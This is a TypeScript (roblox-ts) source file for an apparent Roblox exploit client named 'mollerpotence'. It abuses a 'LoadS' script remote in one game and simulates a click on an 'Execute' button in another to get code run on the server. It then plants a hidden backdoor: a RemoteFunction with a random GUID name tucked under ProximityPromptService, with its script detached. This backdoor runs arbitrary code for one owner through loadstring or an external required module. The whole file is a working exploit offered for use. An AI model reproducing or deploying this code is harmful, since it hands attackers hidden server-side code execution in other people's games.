import Roact from "@rbxts/roact"
import {
	HttpService,
	LogService,
	Players,
	ProximityPromptService,
	ReplicatedStorage,
	RunService,
} from "@rbxts/services"
const [enabled, setEnabled] = Roact.createBinding(false)
function run_script(code: string) {
	const games: Record<number, (() => void) | void> = {
		// Script Showcase
		[1075564225]: () => {
			const remote = game
				.GetService("ReplicatedStorage")
				?.FindFirstChild("ScriptRemotes")
				?.FindFirstChild("LoadS") as RemoteEvent<
				(type: string, code: string) => unknown
			> | void

			remote?.FireServer("Server", code)
		},
		// require script
		[7205570742]: () => {
			// They do a great deal of obfuscation; so let's go through the UI instead
			const playergui = Players.LocalPlayer.FindFirstChildOfClass("PlayerGui")
			let image: ImageButton | void

			if (playergui) {
				for (const child of playergui.GetDescendants()) {
					if (child.IsA("ImageButton") && child.Image === "rbxassetid://20665340") {
						// The script logo at the bottom right
						image = child
					}
				}
			}

			if (image) {
				for (const child of image.Parent!.GetDescendants()) {
					if (child.IsA("TextBox")) {
						child.Text = code
						break
					}
				}
				for (const child of image.Parent!.GetDescendants()) {
					if (child.IsA("TextButton") && child.Text === "Execute") {
						getconnections(child.MouseButton1Click)[0].Fire()
						break
					}
				}
			}
		},
	}

	games[game.PlaceId]?.()

	pcall(() => LogService.ExecuteScript(code))
}
const state: {
	remote?: RemoteFunction<(action: string, detail?: string) => unknown>
	enabled: Roact.Binding<boolean>
} = {
	enabled,
}

async function activate() {
	const remotename = HttpService.GenerateGUID()
	run_script(
		string.format(
			`
pcall(function ()
	script.Parent = nil
end)
local nativeloadstring = pcall(loadstring, '--')
local remote = Instance.new('RemoteFunction', game:GetService('ProximityPromptService'))
remote.Name = %q
local user = %i
function func (player, action, code)
	if player.UserId ~= user then
		print(player.UserId, 'tried to use it, but the owner is', user)
		return
	end
	if action == 'respawn' then
		player:LoadCharacter()
	end
	if action == 'run' then
		task.defer(pcall, function ()
			local run = nativeloadstring and loadstring or require(8194576728)
			run(code)()
		end)
	end
end
remote.OnServerInvoke = func`,
			remotename,
			Players.LocalPlayer?.UserId ?? 78711965
		)
	)
	state.remote = ProximityPromptService.WaitForChild(remotename, 1) as typeof state.remote

	if (state.remote) {
		print("mollerpotence enabled")
		setEnabled(true)
	}
}

activate()
export = state
